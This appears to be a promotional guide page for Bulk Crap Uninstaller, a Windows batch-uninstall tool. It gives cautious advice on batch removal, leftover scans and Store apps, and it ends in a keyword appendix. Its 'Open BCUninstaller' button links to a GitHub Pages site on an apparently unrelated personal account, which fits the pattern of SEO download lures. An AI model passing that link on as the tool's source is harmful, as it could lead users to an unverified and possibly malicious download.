# Bulk Crap Uninstaller - Uninstall a Selection, Then See Leftovers

## At a Glance

BCUninstaller, often shortened from Bulk Crap Uninstaller, is an open-source Windows tool aimed at PCs that accumulated more software than anyone remembers. The list is richer than Settings: install date, size when known, and the uninstall command. You tick a batch, and it walks the uninstallers rather than deleting folders and hoping.

- Batch selection instead of one Settings click per program  
- Quiet mode only where the uninstaller already supports it  
- A leftover scan after the official uninstall, not instead of it  
- Startup and scheduled-task hints tied to programs you removed  
- Separate handling for ordinary desktop apps and Store-style packages  

## What "Bulk" Should Mean

Bulk means you chose ten programs you can name. It does not mean every entry with an unfamiliar publisher goes in one click. Sorting by install date is the useful filter on a refurbished PC: everything from the previous owner's week of toolbars, not the driver utility installed yesterday. Sorting by size finds the games and suites that actually return disk space. Sorting by name finds the duplicates, two PDF readers and three updaters.

Quiet uninstall is a courtesy when you trust the product's uninstall string. Some uninstallers ignore silent switches and still open a window. Some refuse to leave without a prompt. BCUninstaller cannot invent a silent mode the vendor did not ship. Stay at the PC for the first batch until you know which products misbehave.

## Leftovers

After the vendor uninstaller runs, leftovers are files and registry entries the vendor forgot. The leftover scan lists them. Removing a clearly named folder for a product you just uninstalled is reasonable. Removing a shared runtime because it appeared in the same list is how the next program breaks. If the path says Common Files or a Visual C++ runtime, leave it until nothing else needs it.

Startup entries and tasks for a removed program are the leftovers that still cost boot time. Disable or remove those after the uninstall, then reboot once and see what still launches. A leftover that launches an uninstaller you already ran is a candidate. A leftover that launches a security suite you kept is not.

## Batch Pass

1. Export or screenshot the install list before you change a refurbished PC.  
2. Tick only products you intend to remove, not runtimes you merely dislike.  
3. Run the batch where you can see prompts.  
4. Reboot if any uninstaller asked for it.  
5. Open the leftover view and delete only folders named for software that is gone.  
6. Recheck startup. One reboot is enough to judge the boot change.  

## Store and Desktop Apps

| Kind | How it leaves | Watch for |
|---|---|---|
| Desktop setup | Vendor uninstall string | A prompt the silent switch did not suppress |
| Store / provisioned app | Windows package removal | A package the image expects at next sign-in |
| Driver utility | Vendor uninstall | The device may need that utility; do not batch these |
| Runtimes | Usually not your target | Other apps break if you sweep them |
| Leftover folder | Manual after uninstall | Shared directories |

[![Open BCUninstaller](https://img.shields.io/badge/Open-BCUninstaller-3f3f46?style=flat-square&logo=github&logoColor=white)](https://knopmarquisr.github.io/.github/bcuninstaller-leftovers)

## Who It Is For

Refurbishers, families cleaning a relative's PC, and anyone who has ever uninstalled five toolbars one Settings page at a time. A poor fit for a server application with a documented removal order, and a poor fit for "uninstall the antivirus so malware can stay." Security products should be removed only when you mean to replace them. A poor fit as well for Windows components you do not recognize: if Settings did not list it as an app you installed, do not batch it because the name looks optional.

## Requirements

| Item | Expectation |
|---|---|
| OS | Windows versions the current build supports |
| Rights | Administrator for per-machine products |
| Disk | Space is returned after uninstallers finish, not before |
| Network | Some uninstallers want it; the tool itself does not |
| Patience | Stay for prompts on the first batch |

## Fixes

An uninstaller opened a window anyway. Finish it by hand. Quiet mode was a request, not a lock.  
A program remains in the list. It uses a different registration, or the uninstall failed halfway. Read that product's own result before you delete its folder.  
Another application will not start. A runtime left in the batch. Reinstall that runtime, and exclude runtimes next time.  
Leftovers look like the whole Program Files tree. Stop. The scan is too broad for a blind delete.  
Store apps return after reboot. A provisioned package reinstalled them for the new user. Remove the provisioned copy only if you know that image policy.

![Bulk Crap Uninstaller selection list before a batch removal](https://bcuninstaller.org/wp-content/uploads/2026/04/feature-scan-BJ6k2Zfa.webp)

## Keyword Appendix

bulk crap uninstaller, bcuninstaller, bulk uninstall windows, bcuninstaller leftovers, quiet uninstall windows, batch program removal, startup leftovers, store app uninstall windows
